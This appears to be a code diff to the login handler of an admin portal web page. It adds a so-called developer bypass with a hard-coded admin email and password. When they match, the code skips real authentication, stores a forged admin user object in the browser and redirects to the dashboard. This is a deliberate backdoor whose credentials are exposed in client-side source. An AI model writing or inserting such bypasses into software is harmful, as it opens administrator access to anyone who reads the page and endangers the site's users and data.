@@ -259,10 +259,9 @@
         }
 
         document.addEventListener('DOMContentLoaded', function() {
-            // Login form handler
+            // Login form handler (patched for developer admin bypass)
             document.getElementById('loginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
-                
                 const email = document.getElementById('loginEmail').value;
                 const password = document.getElementById('loginPassword').value;
                 const loginButton = document.getElementById('loginButton');
@@ -274,9 +273,24 @@
                 loadingIndicator.classList.remove('hidden');
                 errorMessage.classList.add('hidden');
 
+                // Developer bypass: allow hardcoded admin login
+                const DEV_EMAIL = 'admin@mathturo.com';
+                const DEV_PASSWORD = 'secureadmin123';
+                if (email === DEV_EMAIL && password === DEV_PASSWORD) {
+                    // Simulate admin user object
+                    const user = {
+                        id: 'dev-admin',
+                        email: DEV_EMAIL,
+                        role: 'admin',
+                        fullName: 'Developer Admin'
+                    };
+                    localStorage.setItem('user', JSON.stringify(user));
+                    window.location.href = 'dashboard.html';
+                    return;
+                }
+
                 try {
                     const user = await login(email, password);
-
                     if (user) {
                         if (user.role !== 'admin') {
                             showError('Access denied. This portal is for administrators only.');
